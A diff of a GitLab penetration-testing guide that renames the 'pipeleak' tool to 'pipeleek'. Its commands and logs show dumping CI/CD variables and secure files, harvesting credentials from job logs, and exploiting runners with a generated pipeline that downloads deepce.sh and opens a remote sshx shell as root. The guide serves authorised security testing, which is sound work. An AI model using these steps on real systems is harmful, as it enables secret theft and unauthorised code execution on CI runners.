@@ -38,13 +38,13 @@ Some companies grant their developers `developer` access to each repository, thi
 Usually GitLab does disclose the installed version to auhtenticated users only.
 You can check the version manually at `https://leakycompany.com/help`.
 
-Using [pipeleak](https://github.com/CompassSecurity/pipeleak) we can automate this process and enumerates known vulnerabilities.
+Using [pipeleek](https://github.com/CompassSecurity/pipeleek) we can automate this process and enumerates known vulnerabilities.
 Make sure to verify manually as well.
 
 > To create a Personal Access Token visit https://leakycompany.com/-/user_settings/personal_access_tokens
 
 ```bash
-pipeleak gl vuln -g https://leakycompany.com -t glpat-[redacted]
+pipeleek gl vuln -g https://leakycompany.com -t glpat-[redacted]
 2024-11-14T14:29:05+01:00 info GitLab version=17.5.1-ee
 2024-11-14T14:29:05+01:00 info Fetching CVEs for this version version=17.5.1-ee
 ```
@@ -59,13 +59,13 @@ Dump all CI/CD variables you have access to, to find more secrets.
 
 ```bash
 # Dump variables defined in the projects settings
-pipeleak gl variables -g https://leakycompany.com -t glpat-[redacted]
+pipeleek gl variables -g https://leakycompany.com -t glpat-[redacted]
 
 # Schedules can have separately defined variables
-pipeleak gl schedule -g https://leakycompany.com -t glpat-[redacted]
+pipeleek gl schedule -g https://leakycompany.com -t glpat-[redacted]
 
 # Secure files are an alternative to variables and often times contain sensitive info
-pipeleak gl secureFiles  --gitlab https://leakycompany.com --token glpat-[redacted]
+pipeleek gl secureFiles  --gitlab https://leakycompany.com --token glpat-[redacted]
 2024-11-18T15:38:08Z info Fetching project variables
 2024-11-18T15:38:09Z warn Secure file content="this is a secure file!!" downloadUrl=https://leakycompany.com/api/v4/projects/60367314/secure_files/9149327/download
 2024-11-18T15:38:12Z info Fetched all secure files
@@ -146,14 +146,14 @@ There are many reasons why credentials might be included in the job output. More
 
 **Automating Pipeline Credential Leaks**
 
-[Pipeleak](https://github.com/CompassSecurity/pipeleak) can be used to scan for credentials in the job outputs.
+[Pipeleek](https://github.com/CompassSecurity/pipeleek) can be used to scan for credentials in the job outputs.
 
 ```bash
-$ pipeleak gl scan --token glpat-[redacted] --gitlab https://gitlab.example.com -c [gitlab session cookie]]  -v -a -j 5 --confidence high-verified,high
+$ pipeleek gl scan --token glpat-[redacted] --gitlab https://gitlab.example.com -c [gitlab session cookie]]  -v -a -j 5 --confidence high-verified,high
 2024-09-26T13:47:09+02:00 debug Verbose log output enabled
 2024-09-26T13:47:10+02:00 info Gitlab Version Check revision=2e166256199 version=17.5.0-pre
 2024-09-26T13:47:10+02:00 debug Setting up queue on disk
-2024-09-26T13:47:10+02:00 debug Using DB file file=file:///tmp/pipeleak-queue-db-60689531:?_journal=WAL&_timeout=5000&_fk=true
+2024-09-26T13:47:10+02:00 debug Using DB file file=file:///tmp/pipeleek-queue-db-60689531:?_journal=WAL&_timeout=5000&_fk=true
 2024-09-26T13:47:10+02:00 debug Loading rules.yml from filesystem
 2024-09-26T13:47:10+02:00 debug Applying confidence filter filter=high-verified,high
 2024-09-26T13:47:10+02:00 debug Loaded filtered rules count=882
@@ -170,7 +170,7 @@ If you found any valid credentials, e.g. personal access tokens, cloud credentia
 
 **An example of privilege escalation:**
 
-Pipeleak identified the following based64 encode secret in the environment variable `CI_REPO_TOKEN`:
+Pipeleek identified the following based64 encode secret in the environment variable `CI_REPO_TOKEN`:
 
 ```bash
 CI_SERVER=yes
@@ -192,17 +192,17 @@ curl --request GET --header "PRIVATE-TOKEN: glpat-[redacted]" https://gitlab.com
 
 {
   "id": [redacted],
-  "username": "pipeleak_user",
+  "username": "pipeleek_user",
   "name": "testToken",
   "state": "active",
   "locked": false,
   [redacted]
 }
 
-# Verify using Pipeleak
-pipeleak gl enum -g https://gitlab.com -t glpat-[redacted]
+# Verify using Pipeleek
+pipeleek gl enum -g https://gitlab.com -t glpat-[redacted]
 2025-09-29T12:25:51Z info Enumerating User
-2025-09-29T12:25:51Z warn Current user admin=false bot=false email=test@example.com name="Pipe Leak" username=pipeleak_user
+2025-09-29T12:25:51Z warn Current user admin=false bot=false email=test@example.com name="Pipe Leak" username=pipeleek_user
 2025-09-29T12:25:51Z info Enumerating Access Token
 2025-09-29T12:25:51Z warn Current Token active=true created=2025-09-29T12:25:20Z description=test id=14839115 lastUsedAt=2025-09-29T12:25:51Z lastUsedIps= name=testToken revoked=false scopes=read_api userId=14918432
 2025-09-29T12:25:51Z info Enumerating Projects and Groups
@@ -224,10 +224,10 @@ Doing this manually by creating a project or navigating to an existing one.
 Open the CI/CD Settings page and look at the Runners section: https://leakycompany.com/my-pentest-prject/-/settings/ci_cd
 Runners can be attached globally, on the group level or on individual projects.
 
-Using pipeleak we can automate runner enumeration:
+Using pipeleek we can automate runner enumeration:
 
 ```bash
-$ pipeleak gl runners --token glpat-[redacted] --gitlab https://gitlab.example.com -v list
+$ pipeleek gl runners --token glpat-[redacted] --gitlab https://gitlab.example.com -v list
 2024-09-26T14:26:54+02:00 info group runner description=2-green.shared-gitlab-org.runners-manager.gitlab.com name=comp-test-ia paused=false runner=gitlab-runner tags=gitlab-org type=instance_type
 2024-09-26T14:26:55+02:00 info group runner description=3-green.shared-gitlab-org.runners-manager.gitlab.com/dind name=comp-test-ia paused=false runner=gitlab-runner tags=gitlab-org-docker type=instance_type
 2024-09-26T14:26:55+02:00 info group runner description=blue-3.saas-linux-large-amd64.runners-manager.gitlab.com/default name=comp-test-ia paused=false runner=gitlab-runner tags=saas-linux-large-amd64 type=instance_type
@@ -238,23 +238,23 @@ $ pipeleak gl runners --token glpat-[redacted] --gitlab https://gitlab.example.c
 
 Review the runners and select the interesting ones. The Gitlab Ci/CD config file allows you to select runners by their tags. Thus we create a list of the most interesting tags, printed by the command above.
 
-Pipeleak can generate a `.gitlab-ci.yml` or directly create a project and launch the jobs.
+Pipeleek can generate a `.gitlab-ci.yml` or directly create a project and launch the jobs.
 
 ```bash
 # Manual creation
-$ pipeleak gl runners --token glpat-[redacted] --gitlab https://gitlab.example.com -v exploit --tags saas-linux-small-amd64 --shell --dry
+$ pipeleek gl runners --token glpat-[redacted] --gitlab https://gitlab.example.com -v exploit --tags saas-linux-small-amd64 --shell --dry
 2024-09-26T14:32:26+02:00 debug Verbose log output enabled
 2024-09-26T14:32:26+02:00 info Generated .gitlab-ci.yml
 2024-09-26T14:32:26+02:00 info ---
 stages:
     - exploit
-pipeleak-job-saas-linux-small-amd64:
+pipeleek-job-saas-linux-small-amd64:
     stage: exploit
     image: ubuntu:latest
     before_script:
         - apt update && apt install curl -y
     script:
-        - echo "Pipeleak exploit job"
+        - echo "Pipeleek exploit job"
         - id
         - whoami
         - curl -sL https://github.com/stealthcopter/deepce/raw/main/deepce.sh -o deepce.sh
@@ -268,11 +268,11 @@ pipeleak-job-saas-linux-small-amd64:
 2024-09-26T14:32:26+02:00 info Done, Bye Bye 🏳️‍🌈🔥
 
 # Automated
-$ pipeleak gl runners --token glpat-[redacted]  --gitlab https://gitlab.example.com -v exploit --tags saas-linux-small-amd64 --shell
+$ pipeleek gl runners --token glpat-[redacted]  --gitlab https://gitlab.example.com -v exploit --tags saas-linux-small-amd64 --shell
 2024-09-26T14:33:48+02:00 debug Verbose log output enabled
-2024-09-26T14:33:49+02:00 info Created project name=pipeleak-runner-exploit url=https://gitlab.com/[redacted]/pipeleak-runner-exploit
+2024-09-26T14:33:49+02:00 info Created project name=pipeleek-runner-exploit url=https://gitlab.com/[redacted]/pipeleek-runner-exploit
 2024-09-26T14:33:50+02:00 info Created .gitlab-ci.yml file=.gitlab-ci.yml
-2024-09-26T14:33:50+02:00 info Check pipeline logs manually url=https://gitlab.com/[redacted]/pipeleak-runner-exploit/-/pipelines
+2024-09-26T14:33:50+02:00 info Check pipeline logs manually url=https://gitlab.com/[redacted]/pipeleek-runner-exploit/-/pipelines
 2024-09-26T14:33:50+02:00 info Make sure to delete the project when done
 2024-09-26T14:33:50+02:00 info Done, Bye Bye 🏳️‍🌈🔥
 ```
@@ -280,8 +280,8 @@ $ pipeleak gl runners --token glpat-[redacted]  --gitlab https://gitlab.example.
 If you check the log output you can see the outputs of the commands defined in `script` and an [sshx](https://sshx.io/) Url which gives you an interactive shell in your runner.
 
 ```bash
-$ echo "Pipeleak exploit job"
-Pipeleak exploit job
+$ echo "Pipeleek exploit job"
+Pipeleek exploit job
 $ id
 uid=0(root) gid=0(root) groups=0(root)
 $ whoami
